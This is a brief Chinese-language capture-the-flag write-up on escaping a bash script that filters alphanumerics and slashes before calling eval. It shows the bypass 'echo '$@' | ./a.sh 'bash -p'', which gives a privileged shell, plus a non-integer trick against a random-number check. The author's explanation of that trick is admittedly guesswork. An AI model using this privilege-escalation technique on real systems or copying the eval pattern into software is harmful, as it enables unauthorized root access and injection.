好久没打过靶机了，也没更新过，今天在群里看到了群主发了一个题目就玩了一下，顺便水一期wp

题目：

![Image](https://github.com/user-attachments/assets/fc0e7b25-f7f5-4112-b62e-c8ea3a1179a6)

```
PATH=/usr/bin
read INPUT < <(head -n1 | tr -d "[A-Za-z0-9/]")
eval "$INPUT"
```

浅瞄了一眼，发现`tr`删除了所有字母、数字和斜杠，但保留特殊符号，那就有搞头

ps:`$@` 在 Shell 中表示脚本的所有参数，可被 `eval` 解析。


我们可以构造输入`$@`，绕过字符过滤。然后再传递参数`bash -p`启动特权Shell。

解法：

```
echo '$@' | ./a.sh 'bash -p'
```

但是我的不是预期解

![Image](https://github.com/user-attachments/assets/ab840e31-5f1c-412b-a8df-2db99a44fd34)

![Image](https://github.com/user-attachments/assets/3ecc6cd4-ab37-4063-bbd5-6048bbaece43)

这两个是预期的

然后.....

![Image](https://github.com/user-attachments/assets/52e78ed7-bec6-4ed0-96c5-e5af4f9b607b)

加强版：

```
#!/bin/bash

PATH=/usr/bin

a=$((RANDOM%100))

echo $a

read -r INPUTS


if [[ "$INPUTS" -ne "$a" ]]; then
    exit 1
fi

read INPUT < <(head -n1 | tr -d "[A-Za-z0-9/]")
eval "$INPUT"
```

加了一个随机数，我本身是说爆破的......

![Image](https://github.com/user-attachments/assets/029e382c-087a-4ef2-8c0e-be1ca3bcd4ae)

然后后面有空瞄了几眼，因为我知道它在进行整数的比较，那我就在想如果输入一个非整数会怎么样，然后......

![Image](https://github.com/user-attachments/assets/4bf631d6-095d-4a85-9563-463d3d749875)

有戏

![Image](https://github.com/user-attachments/assets/c21ca639-c103-41c8-8e62-47ca0cde35a1)

然后我后面我想找一下这方面的资料，但是我没找到，我打算明天再去问问群主，因为他bash比较好（不过我感觉他会自己来看我的wp）

目前我的理解是当使用-ne比较非数字字符串时，Bash会尝试将两边转换为整数。如果转换失败，就会报错什么的，[[ ]]表达式的结果会被视为false，因为比较操作本身无效，导致整个条件判断为假，因此不执行exit 1。


不管了，睡觉，等群主给我解惑了